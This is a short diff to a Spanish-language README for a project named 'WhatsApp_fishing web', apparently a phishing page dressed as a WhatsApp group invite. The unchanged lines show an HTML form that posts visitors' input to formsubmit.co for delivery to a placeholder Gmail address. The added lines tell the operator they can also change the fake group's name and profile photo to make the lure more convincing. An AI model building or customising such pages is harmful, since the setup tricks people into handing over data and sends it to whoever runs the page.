@@ -16,6 +16,9 @@ WhatsApp_fishing web
 ```html
  <form action="https://formsubmit.co/username@gmail.com" method="POST">
 ```
+# nombre
+
+> también puedes editar el nombre del grupo como la foto de perfil :)
 
 # enlace de archivos 
 
